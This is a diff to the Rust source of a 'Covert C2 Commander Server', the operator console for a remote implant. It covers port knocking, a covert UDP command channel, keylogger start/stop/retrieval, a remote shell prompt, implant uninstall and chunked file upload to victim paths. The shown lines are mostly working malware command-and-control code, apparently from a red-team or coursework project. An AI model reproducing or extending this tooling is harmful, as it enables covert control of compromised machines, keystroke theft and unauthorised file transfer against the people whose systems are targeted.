@@ -1,9 +1,21 @@
+/// Covert C2 Commander Server
+///
+/// Features:
+/// - Menu-driven state machine (Disconnected/Connected)
+/// - Port knock initiation via port_knkr module
+/// - Covert UDP channel for C2 commands
+/// - Keylogger control, shell execution, file transfer
+///
+/// Compliance: All protocol data in UDP payload only.
+/// UDP header fields are OS-managed; no transport-layer abuse.
+
 use std::collections::HashMap;
 use std::io::{self, Write};
 use std::net::{Ipv4Addr, IpAddr, SocketAddr, UdpSocket};
 use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
 use std::thread;
 use std::time::{Duration, Instant};
+
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3};
 use pnet_datalink as datalink;
@@ -16,7 +28,7 @@ use port_knkr::{KnockSession, port_knock};
 use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
-             PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
+             PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
 
@@ -339,7 +351,6 @@ impl Commander {
         loop {
             let cmd = prompt("Shell > ");
             
-            // Check for exit command
             if cmd.trim().to_lowercase() == "exit" {
                 println!("[+] Returning to menu...");
                 break;
@@ -381,20 +392,19 @@ impl Commander {
             }
         };
 
-        // Build metadata: path_len + path + file_size (as first FILE chunk)
+        // Build metadata: path_len + path + file_size
         let mut metadata = Vec::new();
-        metadata.push(remote_path.as_bytes().len() as u8);  // path_len
-        metadata.extend_from_slice(remote_path.as_bytes());  // path
-        metadata.extend_from_slice(&(file_data.len() as u32).to_le_bytes());  // file_size
+        metadata.push(remote_path.as_bytes().len() as u8);
+        metadata.extend_from_slice(remote_path.as_bytes());
+        metadata.extend_from_slice(&(file_data.len() as u32).to_le_bytes());
         
-        // Send metadata as FIRST file chunk (PACKET_TYPE_FILE)
+        // Send as PACKET_TYPE_FILE (not CMD)
         if self.send_packet(PACKET_TYPE_FILE, 0, &metadata).is_err() {
             println!("[!] Failed to send metadata");
             return;
         }
         println!("[+] Metadata sent");
 
-        // Send file chunks
         let total_chunks = (file_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
         for (i, chunk) in file_data.chunks(CHUNK_SIZE).enumerate() {
             print!("\r[*] Uploading chunk {}/{}...", i + 1, total_chunks);
@@ -407,7 +417,6 @@ impl Commander {
             thread::sleep(Duration::from_millis(50));
         }
 
-        // Send end marker
         self.send_packet(PACKET_TYPE_FILE, 0, &[0xFF]).ok();
         println!("\n[+] File upload complete!");
     }
